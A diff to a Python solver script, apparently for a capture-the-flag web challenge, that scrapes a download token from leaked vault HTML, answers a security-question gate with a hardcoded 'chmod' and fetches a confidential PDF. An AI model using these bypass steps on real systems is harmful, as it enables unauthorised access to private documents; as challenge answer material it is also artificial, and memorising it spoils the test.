@@ -23,6 +23,14 @@ def solve():
         return False
     print("[+] Success! Leaked entire vault containing 7 public, confidential, and restricted documents!")
     
+    # Parse the URL cryptographic signature token for document 5 from the leaked results
+    token_match = re.search(r'href="/download/5\?token=([0-9a-fA-F]+)"', html)
+    if not token_match:
+        print("[-] Could not parse URL signature token for document 5!")
+        return False
+    token = token_match.group(1)
+    print(f"[+] Parsed URL verification token: {token}")
+    
     print("[+] Step 3: Conducting OSINT Recon on Team Directory...")
     res_team = client.get("/team")
     team_html = res_team.data.decode('utf-8')
@@ -43,7 +51,7 @@ def solve():
     
     print("[+] Step 4: Bypassing Security Challenge Question Gate (/download/5)...")
     # Arthur's document is ID 5. Question: Which Linux command is used to change file permissions? Ans: chmod
-    res_gate = client.post("/download/5", data={'answer': 'chmod'})
+    res_gate = client.post(f"/download/5?token={token}", data={'answer': 'chmod'})
     gate_html = res_gate.data.decode('utf-8')
     if "Access Granted" not in gate_html:
         print("[-] Failed to pass security challenge gate for target PDF!")
@@ -51,7 +59,7 @@ def solve():
     print("[+] Correctly answered security password ('chmod'). Success audio played & download initiated!")
     
     print("[+] Step 5: Downloading PDF & Inspecting Metadata Subject...")
-    res_pdf = client.get("/secure_fetch/5")
+    res_pdf = client.get(f"/secure_fetch/5?token={token}")
     pdf_bytes = res_pdf.data
     print(f"[+] Downloaded confidential_memo.pdf ({len(pdf_bytes)} bytes)!")
         
